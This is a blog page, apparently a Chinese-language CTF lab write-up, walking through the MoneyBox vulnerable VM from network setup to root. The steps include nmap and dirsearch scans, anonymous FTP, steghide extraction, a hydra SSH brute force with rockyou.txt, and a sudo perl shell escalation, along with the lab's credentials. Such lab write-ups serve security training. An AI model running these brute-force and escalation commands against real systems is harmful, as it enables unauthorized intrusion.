@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>moneybox靶机 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="一、下载好Oracle VM VirtualBox https:&#x2F;&#x2F;www.oracle.com&#x2F;cn&#x2F;virtualization&#x2F;virtualbox&#x2F; 二、准备一个moneybox靶机 1.管理-&gt;导入虚拟电脑  2.选择MoneyBox.ova，然后点击下一步-&gt;完成  3.右击Debian Custum CTF-&gt;设置  4.usb设备选择1.1，连接方式选择仅主机，点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moneybox靶机">
+<meta property="og:url" content="http://example.com/2024/01/07/moneybox%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、下载好Oracle VM VirtualBox https:&#x2F;&#x2F;www.oracle.com&#x2F;cn&#x2F;virtualization&#x2F;virtualbox&#x2F; 二、准备一个moneybox靶机 1.管理-&gt;导入虚拟电脑  2.选择MoneyBox.ova，然后点击下一步-&gt;完成  3.右击Debian Custum CTF-&gt;设置  4.usb设备选择1.1，连接方式选择仅主机，点">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359191151-30dd7bb5-0206-4c95-b986-7575b1ce426d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359245407-135db48c-8f34-4daf-b026-8718e9dce8a2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359386168-14df26ae-b333-4ff0-82d5-3e5f17839495.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359470059-93f58155-bc9e-43d4-8ac3-c25b81a47e43.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359585444-fee9961e-37eb-4b21-8773-c54b5be42f68.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359654174-64eece20-6eb6-4eb5-b15a-52ae190b498a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359727039-d4476254-5cc4-4989-9fec-e3fe7ffc51e5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359767977-8c4d6629-6e7f-4f08-a66c-f95cd434b560.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359881187-3c1da272-4aee-4b96-8e9b-fc6c43993281.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359986354-98b5f287-60ca-4240-8538-e22338bc3a44.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704360138761-f2acf464-b55c-448f-8382-3bcd29aa9131.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704360341047-30f9de69-854b-45fd-96dc-1be4c76f8e32.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704367679398-693fefb4-a7f1-45a2-8757-73d5a6b32b3a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704367781942-2cdd8b40-f3a8-4937-bd9e-809e2e130633.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704368807478-5ac52a78-84ff-4123-890d-79f235239405.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704369006738-d29e5aef-2f70-495b-9c4a-1dc1b772bd89.png">
+<meta property="og:image" content="http://example.com/moneybox%E9%9D%B6%E6%9C%BA.assets/1704369078118-aee6ea24-d56c-48ef-a6b6-65e7ecaefe61.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704369136979-ec83d213-4329-4160-a7b7-85c4000e98a8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704369432272-ecb6a7c7-a890-481d-9636-8d6d92be765c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704369536105-7405c248-ec80-4985-ad26-7f288d4f1de1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704369577299-e4183537-7520-46bf-8a04-43f47746c580.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704369652227-336ea528-4037-4d29-9574-2363a53b3219.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704369747351-f3f76d7b-93a3-434d-8560-bdbf78d9df05.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704369845359-7ebd0cff-c82c-4bd7-af41-e3dbaca9f04e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704370115844-858b6f2a-9551-4cfd-90f6-b633354eb1a1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704370336533-ed0e520b-9874-4c55-a87f-4b4ad51b4f28.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704370487459-69f53dcb-7c09-4086-93ae-b4fa89344b99.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704370560483-f3d1f26d-fb1c-4d11-89f4-38130ad540db.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704370663186-329ed84d-dd61-4c7c-a3dd-0c298931639d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704370769662-64eb65e7-0766-4af0-96b8-3bee35428332.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704370835294-18ea45ec-a388-43f0-a852-b131a8b18c39.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704370911765-00d9cefa-c549-40b6-810b-e3bce7dbcaa0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704371148860-d1530728-1133-4271-9b58-a62d81b09055.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704371195271-0346db6d-6f59-4635-b87d-57ad65bcf752.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704371349793-f097e5db-7c20-49aa-8c86-b6241c63ed4b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704371440660-cddf5141-c312-4904-b61b-f67747940f7c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704371499232-1c8621f3-fbda-4c03-8f47-109f04f0ef64.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704371587090-1ca95c65-f557-4279-987e-695ff388775a.png">
+<meta property="article:published_time" content="2024-01-07T12:57:39.000Z">
+<meta property="article:modified_time" content="2024-01-07T13:01:47.848Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1704359191151-30dd7bb5-0206-4c95-b986-7575b1ce426d.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/default-avatar.jpg">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/highlight.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" title="图片来自网络">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/archives" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-moneybox靶机" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      moneybox靶机
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2024/01/07/moneybox%E9%9D%B6%E6%9C%BA/" class="article-date">
+  <time datetime="2024-01-07T12:57:39.000Z" itemprop="datePublished">2024-01-07</time>
+</a>
+    
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>一、下载好Oracle VM VirtualBox</p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/cn/virtualization/virtualbox/">https://www.oracle.com/cn/virtualization/virtualbox/</a></p>
+<p>二、准备一个moneybox靶机</p>
+<p>1.管理-&gt;导入虚拟电脑</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359191151-30dd7bb5-0206-4c95-b986-7575b1ce426d.png" alt="img"></p>
+<p>2.选择MoneyBox.ova，然后点击下一步-&gt;完成</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359245407-135db48c-8f34-4daf-b026-8718e9dce8a2.png" alt="img"></p>
+<p>3.右击Debian Custum CTF-&gt;设置</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359386168-14df26ae-b333-4ff0-82d5-3e5f17839495.png" alt="img"></p>
+<p>4.usb设备选择1.1，连接方式选择仅主机，点一下高级，记住mac地址的后四位，设置完成后双击启动</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359470059-93f58155-bc9e-43d4-8ac3-c25b81a47e43.png" alt="img"></p>
+<p>三、打开VMware</p>
+<p>1.编辑-&gt;虚拟网络编辑器-&gt;更改设置</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359585444-fee9961e-37eb-4b21-8773-c54b5be42f68.png" alt="img"></p>
+<p>2.将桥接模式设置为Host-Only，然后点击确定，</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359654174-64eece20-6eb6-4eb5-b15a-52ae190b498a.png" alt="img"></p>
+<p>3.右击kali-&gt;设置</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359727039-d4476254-5cc4-4989-9fec-e3fe7ffc51e5.png" alt="img"></p>
+<p>4.网络适配器设置为桥接模式，网络适配器2设置为NAT，然后打开kali</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359767977-8c4d6629-6e7f-4f08-a66c-f95cd434b560.png" alt="img"></p>
+<p>四、拿下flag</p>
+<p>1.ifdown eth0 关闭eth0网卡</p>
+<p>ifup eth0  打开eth0网卡</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359881187-3c1da272-4aee-4b96-8e9b-fc6c43993281.png" alt="img"></p>
+<p>2.使用ifconfig命令查看eth0的网卡配置状态，看是否在192.168.56.0&#x2F;24</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704359986354-98b5f287-60ca-4240-8538-e22338bc3a44.png" alt="img"></p>
+<p>3.arp-scan -l -I eth0  查看192.168.56.0&#x2F;24范围内的所存活的ip</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704360138761-f2acf464-b55c-448f-8382-3bcd29aa9131.png" alt="img"></p>
+<p>4.对照刚刚记住的靶机的mac地址CA4F，可以看出靶机的ip为192.168.56.104</p>
+<p>5.nmap -sn 192.168.56.104</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704360341047-30f9de69-854b-45fd-96dc-1be4c76f8e32.png" alt="img"></p>
+<p>6.nmap -p 1-1000 192.168.56.104</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704367679398-693fefb4-a7f1-45a2-8757-73d5a6b32b3a.png" alt="img"></p>
+<p>7.nmap -p 21,22,80 -sC 192.168.56.104</p>
+<p>可以发现一个Anonymous用户名和一个名为trytofind.jpg的文件</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704367781942-2cdd8b40-f3a8-4937-bd9e-809e2e130633.png" alt="img"></p>
+<p>8.dirsearch -u “192.168.56.104” -x 403,404,401</p>
+<p>扫描出一个blogs目录</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704368807478-5ac52a78-84ff-4123-890d-79f235239405.png" alt="img"></p>
+<p>9.打开kali自带的火狐浏览器，输入192.168.56.104，右击查看页面源代码，没有发现什么有价值的内容</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704369006738-d29e5aef-2f70-495b-9c4a-1dc1b772bd89.png" alt="img"></p>
+<p>10.加上刚刚扫描到的blogs目录，发现一个秘密目录</p>
+<p><img src="/moneybox%E9%9D%B6%E6%9C%BA.assets/1704369078118-aee6ea24-d56c-48ef-a6b6-65e7ecaefe61.png" alt="img"></p>
+<p>11.进入秘密目录</p>
+<p>得到一个密钥，感觉很关键，先放在这里</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704369136979-ec83d213-4329-4160-a7b7-85c4000e98a8.png" alt="img"></p>
+<p>12.ftp 192.168.56.104</p>
+<p>用户名和密码为：Anonymous;Anonymous</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704369432272-ecb6a7c7-a890-481d-9636-8d6d92be765c.png" alt="img"></p>
+<p>13.输入help查看有哪些名可以使用</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704369536105-7405c248-ec80-4985-ad26-7f288d4f1de1.png" alt="img"></p>
+<p>14.ls查看一下</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704369577299-e4183537-7520-46bf-8a04-43f47746c580.png" alt="img"></p>
+<p>15.使用get命令下载文件</p>
+<p>get trytofind.jpg</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704369652227-336ea528-4037-4d29-9574-2363a53b3219.png" alt="img"></p>
+<p>16.文件下载后打开发现是一个图片，但貌似获取不到什么有用的信息</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704369747351-f3f76d7b-93a3-434d-8560-bdbf78d9df05.png" alt="img"></p>
+<p>17.尝试用二进制的形式查看图片</p>
+<p>strings trytofind.jpg</p>
+<p>发现有很多括号，正常图片是不会出现这些内容的</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704369845359-7ebd0cff-c82c-4bd7-af41-e3dbaca9f04e.png" alt="img"></p>
+<p>18.steghide info trytofind.jpg查看图片是否藏了文件</p>
+<p>找不到命令steghide，执行以下apt-get install steghide</p>
+<p>可以发现确实隐藏了一个文件，但是好像缺少了一个密钥</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704370115844-858b6f2a-9551-4cfd-90f6-b633354eb1a1.png" alt="img"></p>
+<p>19.联想刚刚在页面源代码找到的密钥</p>
+<p>steghide  extract -sf trytofind.jpg </p>
+<p>输入密钥3xtr4ctd4t4</p>
+<p>成功剥离出一个data.txt文件，用户名提示为renu，对这个提示进行尝试，看能不能通过字典爆出密码</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704370336533-ed0e520b-9874-4c55-a87f-4b4ad51b4f28.png" alt="img"></p>
+<p>20.hydra -l renu -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  ssh:&#x2F;&#x2F;192.168.56.104</p>
+<p>得到ssh登录密码为：987654321</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704370487459-69f53dcb-7c09-4086-93ae-b4fa89344b99.png" alt="img"></p>
+<p>21.ssh <a href="mailto:&#114;&#101;&#110;&#117;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#x35;&#x36;&#x2e;&#49;&#48;&#52;">&#114;&#101;&#110;&#117;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#x35;&#x36;&#x2e;&#49;&#48;&#52;</a></p>
+<p>进行ssh登录输入密码</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704370560483-f3d1f26d-fb1c-4d11-89f4-38130ad540db.png" alt="img"></p>
+<p>22.ls查看文件，发现有一个user1.txt的文件，那就cat user1.txt</p>
+<p>发现第一个flag，现在离成功不远了</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704370663186-329ed84d-dd61-4c7c-a3dd-0c298931639d.png" alt="img"></p>
+<p>23.ls -all查看所有文件包括隐藏文件，有个history历史记录</p>
+<p>cat .bash_history</p>
+<p>发现还有一个lily用户</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704370769662-64eb65e7-0766-4af0-96b8-3bee35428332.png" alt="img"></p>
+<p>24.ssh登录这个lily用户</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704370835294-18ea45ec-a388-43f0-a852-b131a8b18c39.png" alt="img"></p>
+<p>25.同样ls查看文件发现一个user2.txt文件，cat user2.txt</p>
+<p>得到第二个flag</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704370911765-00d9cefa-c549-40b6-810b-e3bce7dbcaa0.png" alt="img"></p>
+<p>26.ls -all发现有个历史文件</p>
+<p>cat .bash_history</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704371148860-d1530728-1133-4271-9b58-a62d81b09055.png" alt="img"></p>
+<p>27.发现有个sudo -l命令</p>
+<p>那么执行一下看看有什么，发现一个&#x2F;usr&#x2F;bin&#x2F;perl</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704371195271-0346db6d-6f59-4635-b87d-57ad65bcf752.png" alt="img"></p>
+<p>28.打开<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>搜索perl，点击perl，找到sudo提权模块</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704371349793-f097e5db-7c20-49aa-8c86-b6241c63ed4b.png" alt="img"></p>
+<p>29.输入下面的命令</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704371440660-cddf5141-c312-4904-b61b-f67747940f7c.png" alt="img"></p>
+<p>30.cd &#x2F;root进行提权</p>
+<p>ls -all命令查看所有文件，发现有一个.root.txt文件</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704371499232-1c8621f3-fbda-4c03-8f47-109f04f0ef64.png" alt="img"></p>
+<p>31.cat .root.txt</p>
+<p>查看这个文件可以发现获取到了最终的一个flag</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1704371587090-1ca95c65-f557-4279-987e-695ff388775a.png" alt="img"></p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E5%BC%B9/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">sql注入第三弹</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    <link rel="stylesheet" href="/css/gitment.css"> 
+<script src="/js/gitment.js"></script>
+
+<div id="gitmentContainer"></div>
+
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
+    <h3 class="avatar-name">
+      
+        渗透不了一点
+      
+    </h3>
+    <p class="avatar-slogan">
+      缘分落地生根是我们。
+    </p>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/1/" rel="tag">1</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/1/" style="font-size: 10px;">1</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/07/moneybox%E9%9D%B6%E6%9C%BA/">moneybox靶机</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E5%BC%B9/">sql注入第三弹</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%BA%8C%E5%BC%B9%EF%BC%88sqlmap%EF%BC%89/">sql注入第二弹（sqlmap）</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%80%E5%BC%B9/">sql注入第一弹</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/25/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB/">前后端分离</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+        <a style="display: block;" href="https://yiluyanxia.github.io/" title target='_blank'
+        >一路眼瞎</a>
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2024 John Doe &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a target="_blank" rel="noopener" href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/archives" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
